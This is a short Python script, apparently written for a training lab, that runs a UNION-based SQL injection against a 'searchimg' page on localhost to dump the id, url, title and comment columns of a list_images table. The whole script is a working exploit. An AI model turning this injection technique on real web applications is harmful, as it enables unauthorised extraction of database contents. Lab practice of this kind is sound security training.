from requests import get
import re

def dump_column(col: str):
    id = f"0 UNION SELECT {col}, null FROM list_images"
    url = f"http://localhost:8080/index.php?page=searchimg&id={id}&Submit=Submit#"
    response = get(url)
    txt = response.text
    c = re.findall(r"Url :\s*([^\n<]+)", txt)
    return c

def main():
    # url
    res = dump_column("id")
    ids = res

    # url
    res = dump_column("url")
    urls = res

    # title
    res = dump_column("title")
    titles = res

    # comment
    res = dump_column("comment")
    comments = res

    db = []

    for i in range(len(ids)):
        db.append({
            "id": ids[i],
            "url": urls[i],
            "title": titles[i],
            "comment": comments[i]
        })

    for entry in db:
        print("{")
        for key in entry:
            print(f"\t{key}: {entry[key]}")
        print("}")

if __name__ == "__main__":
	main()